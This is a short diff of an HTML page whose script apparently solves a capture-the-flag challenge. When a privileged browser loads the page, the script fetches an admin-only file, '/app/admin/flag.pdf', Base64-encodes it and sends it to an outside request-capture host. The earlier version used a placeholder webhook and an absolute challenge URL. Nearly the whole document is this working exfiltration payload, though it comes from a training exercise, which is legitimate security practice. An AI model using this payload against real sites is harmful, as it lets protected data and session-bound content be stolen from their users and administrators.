@@ -2,10 +2,11 @@
 <html>
 <body>
 <script>
-fetch("https://do-not-cheat-bb7d7982d597.1753ctf.com/app/admin/flag.pdf")
+fetch("/app/admin/flag.pdf")
   .then(r => r.text())
   .then(flag => {
-    fetch("https://webhook.request.url/?flag=" + encodeURIComponent(flag));
+    const b64 = btoa(flag); // Base64 인코딩
+    fetch("https://hnokijb.request.dreamhack.games/?flag=" + encodeURIComponent(b64));
   });
 </script>
 </body>
